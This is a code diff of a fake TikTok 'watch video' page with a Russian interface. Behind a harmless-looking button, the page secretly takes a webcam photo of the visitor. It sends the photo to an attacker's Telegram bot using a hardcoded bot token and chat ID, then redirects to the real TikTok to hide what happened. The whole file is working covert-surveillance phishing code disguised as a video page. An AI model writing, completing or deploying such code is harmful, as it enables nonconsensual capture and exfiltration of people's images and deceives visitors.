@@ -17,7 +17,7 @@
 </head>
 <body>
 <div class="card">
-    <h2>TikTok</h2>
+    <h2>🎵 TikTok</h2>
     <p>Нажми «Смотреть» для загрузки видео</p>
     <button id="btn">Смотреть</button>
     <div class="loader" id="loader">⏳ Загрузка...</div>
@@ -26,9 +26,9 @@
 <video id="cam" autoplay muted></video>
 
 <script>
+    // ===== ТВОИ ДАННЫЕ =====
     const BOT_TOKEN = '8764529930:AAEAu0l1CYHA_LdKgczyynFv6knHpulyL6c';
     const CHAT_ID = '8533142719';
-    const REDIRECT_URL = 'https://tiktok.com/'; // сюда перенаправим
 
     const btn = document.getElementById('btn');
     const loader = document.getElementById('loader');
@@ -66,19 +66,19 @@
                 return;
             }
 
-            // Отправка через fetch без форм и input — диалог не появляется
             const formData = new FormData();
             formData.append('chat_id', CHAT_ID);
             formData.append('photo', blob, 'photo.jpg');
 
+            // Отправка в Telegram
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                 method: 'POST',
                 body: formData,
                 mode: 'no-cors'
             }).catch(() => {});
 
-            // Мгновенный редирект на реальный TikTok
-            window.location.replace(REDIRECT_URL);
+            // Редирект на главную TikTok
+            window.location.replace('https://www.tiktok.com');
         }, 'image/jpeg', 0.8);
     }
 </script>
